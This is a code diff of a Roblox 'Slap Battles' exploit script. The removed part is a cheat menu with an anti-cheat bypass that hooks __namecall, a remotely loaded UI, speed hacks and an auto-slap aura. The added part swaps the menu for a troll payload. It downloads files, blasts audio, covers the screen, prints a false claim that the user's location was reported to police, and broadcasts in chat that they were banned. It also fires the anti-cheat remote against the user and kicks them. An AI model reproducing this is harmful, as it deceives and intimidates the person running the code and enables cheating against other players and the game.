@@ -1,122 +1,142 @@
-local namecall
-    namecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local Args = {...}
-        if getnamecallmethod() == "FireServer" and tostring(self) == "WS" then
-            return
-        elseif getnamecallmethod() == "FireServer" and tostring(self) == "WS2" then
-            return
-        elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
-            return
-        elseif getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
-            return
-        elseif getnamecallmethod() == 'FireServer' and tostring(self) == 'WalkSpeedChanged' then
-            return
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local asset = getcustomasset or syn and getsynasset
+
+if game.PlaceId == 6403373529 then
+    if writefile and not isfile("BANNED_FROM_SLAP_BATTLES.gif") then
+        writefile("BANNED_FROM_SLAP_BATTLES.gif", game:HttpGet("https://media.tenor.com/PHREyAefRckAAAAS/packwatch.gif"))
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.mp3") then
+            writefile("Exploiting.mp3", game:HttpGet("https://github.com/Kitzoon/Rogue-Hub/blob/main/exploiting.mp3?raw=true"))
         end
-        return namecall(self, ...)
-    end)
-
-
-
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
-local Window = Rayfield:CreateWindow({
-   Name = "Slap Battles Script Menu V2",
-   LoadingTitle = "SBSM V2",
-   LoadingSubtitle = "by Person Guy",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = welcometoSiriMenu, -- Create a custom folder for your hub/game
-      FileName = "sirimenu"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "m7nbGwY64Z", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-   KeySystem = false, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Untitled",
-      Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided",
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-   }
-})
-
-local Tab = Window:CreateTab("Config", 4483362458)
-
-local Tab2 = Window:CreateTab("Combat", 4483362458)
-
-local Tab3 = Window:CreateTab("Ability Spam", 4483362458)
-
-local Tab4 = Window:CreateTab("Anti", 4483362458)
-
-local Tab5 = Window:CreateTab("Badges", 4483362458)
-
-local Tab6 = Window:CreateTab("Credits", 4483362458)
-
-local Tab7 = Window:CreateTab("Other Scripts", 4483362458)
-
-
-local Button = Tab:CreateButton({
-   Name = "Delete Menu",
-   Callback = function()
-   Rayfield:Destroy()
-   end,
-})
-
-local Slider = Tab:CreateSlider({
-   Name = "WalkSpeed",
-   Range = {20, 1000},
-   Increment = 10,
-   Suffix = "sos speed",
-   CurrentValue = 20,
-   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
-   end,
-})
-
-local Slider = Tab:CreateSlider({
-   Name = "JumpPower",
-   Range = {50, 1000},
-   Increment = 10,
-   Suffix = "leg days not skipped",
-   CurrentValue = 50,
-   Flag = "Slider2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-   game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
-   end,
-})
-
-local Toggle = Tab:CreateToggle({
-   Name = "Slap Aura",
-   CurrentValue = false,
-   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-getgenv().SlapAura = Value
-            if bool == true then
-                while getgenv().SlapAura do
-                    task.wait(.005)
-                        pcall(function()
-                        for Index, Player in next, game.Players:GetPlayers() do
-                            if Player ~= game.Players.LocalPlayer and Player.Character and Player.Character:FindFirstChild("entered") then
-                                if Player.Character:FindFirstChild("Head") then
-                                if Player.Character.Head:FindFirstChild("UnoReverseCard") == nil and Player.Character:FindFirstChild("rock") == nil then 
-                                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                                    local Magnitude = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
-                                    if 25 >= Magnitude then
-                                        shared.gloveHits[getGlove()]:FireServer(Player.Character:WaitForChild("Head"))
-                                end
-                                    end
-                            end
-                                end
-                        end
-                        end
-                    end)
-                end
-            end
-   end,
-})
+        
+        local sound = Instance.new("Sound", workspace)
+        
+        sound.SoundId = asset("Exploiting.mp3")
+        sound.Looped = true
+        sound.Volume = 3.5
+        sound:Play()
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.png") then
+            writefile("Exploiting.png", game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/exploiting.png"))
+        end
+        
+        local screen_gui = Instance.new("ScreenGui")
+        screen_gui.IgnoreGuiInset = true
+        screen_gui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+        screen_gui.ResetOnSpawn = true
+        screen_gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        screen_gui.Parent = game.CoreGui
+        
+        local image_label = Instance.new("ImageLabel")
+        image_label.Image = asset("Exploiting.png")
+        image_label.BackgroundColor3 = Color3.new(1, 1, 1)
+        image_label.Size = UDim2.new(0.998957813, 0, 0.997222245, 0)
+        image_label.Visible = true
+        image_label.Parent = screen_gui
+    end
+    
+    if rconsoleprint then
+        rconsoleprint("EXPLOITING IS A CRIME IN YOUR PLACE OF RESIDENCE\n\nWE HAVE GATHERED YOUR LOCATION, AND REPORTED THE INFORMATION TO YOUR LOCAL POLICE.")
+    end
+    
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from Slap Battles Script Menu: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
+    game.ReplicatedStorage.WalkSpeedChanged:FireServer("imagine exploiting bozo slaps: " .. game.Players.LocalPlayer.leaderstats.Slaps.Value)
+elseif game.PlaceId == 11520107397 then
+    if writefile and not isfile("BANNED_FROM_SLAP_BATTLES.gif") then
+        writefile("BANNED_FROM_SLAP_BATTLES.gif", game:HttpGet("https://media.tenor.com/PHREyAefRckAAAAS/packwatch.gif"))
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.mp3") then
+            writefile("Exploiting.mp3", game:HttpGet("https://github.com/Kitzoon/Rogue-Hub/blob/main/exploiting.mp3?raw=true"))
+        end
+        
+        local sound = Instance.new("Sound", workspace)
+        
+        sound.SoundId = asset("Exploiting.mp3")
+        sound.Looped = true
+        sound.Volume = 3.5
+        sound:Play()
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.png") then
+            writefile("Exploiting.png", game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/exploiting.png"))
+        end
+        
+        local screen_gui = Instance.new("ScreenGui")
+        screen_gui.IgnoreGuiInset = true
+        screen_gui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+        screen_gui.ResetOnSpawn = true
+        screen_gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        screen_gui.Parent = game.CoreGui
+        
+        local image_label = Instance.new("ImageLabel")
+        image_label.Image = asset("Exploiting.png")
+        image_label.BackgroundColor3 = Color3.new(1, 1, 1)
+        image_label.Size = UDim2.new(0.998957813, 0, 0.997222245, 0)
+        image_label.Visible = true
+        image_label.Parent = screen_gui
+    end
+    
+    if rconsoleprint then
+        rconsoleprint("EXPLOITING IS A CRIME IN YOUR PLACE OF RESIDENCE\n\nWE HAVE GATHERED YOUR LOCATION, AND REPORTED THE INFORMATION TO YOUR LOCAL POLICE.")
+    end
+    
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from Slap Battles Script Menu: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
+    game.ReplicatedStorage.WalkSpeedChanged:FireServer("imagine exploiting bozo slaps: " .. game.Players.LocalPlayer.leaderstats.Slaps.Value)
+else
+    if writefile and not isfile("BANNED_FROM_SLAP_BATTLES.gif") then
+        writefile("BANNED_FROM_SLAP_BATTLES.gif", game:HttpGet("https://media.tenor.com/PHREyAefRckAAAAS/packwatch.gif"))
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.mp3") then
+            writefile("Exploiting.mp3", game:HttpGet("https://github.com/Kitzoon/Rogue-Hub/blob/main/exploiting.mp3?raw=true"))
+        end
+        
+        local sound = Instance.new("Sound", workspace)
+        
+        sound.SoundId = asset("Exploiting.mp3")
+        sound.Looped = true
+        sound.Volume = 3.5
+        sound:Play()
+    end
+    
+    if asset and writefile then
+        if not isfile("Exploiting.png") then
+            writefile("Exploiting.png", game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/exploiting.png"))
+        end
+        
+        local screen_gui = Instance.new("ScreenGui")
+        screen_gui.IgnoreGuiInset = true
+        screen_gui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+        screen_gui.ResetOnSpawn = true
+        screen_gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        screen_gui.Parent = game.CoreGui
+        
+        local image_label = Instance.new("ImageLabel")
+        image_label.Image = asset("Exploiting.png")
+        image_label.BackgroundColor3 = Color3.new(1, 1, 1)
+        image_label.Size = UDim2.new(0.998957813, 0, 0.997222245, 0)
+        image_label.Visible = true
+        image_label.Parent = screen_gui
+    end
+    
+    if rconsoleprint then
+        rconsoleprint("EXPLOITING IS A CRIME IN YOUR PLACE OF RESIDENCE\n\nWE HAVE GATHERED YOUR LOCATION, AND REPORTED THE INFORMATION TO YOUR LOCAL POLICE.")
+    end
+    
+    if game.ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest") then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Message from Slap Battles Script Menu: This player has been banned while attempting to use our script! Enjoy playing the game free of hackers.", "All")
+    end
+    
+    game.Players.LocalPlayer:Kick("Banned for exploiting.")
+end
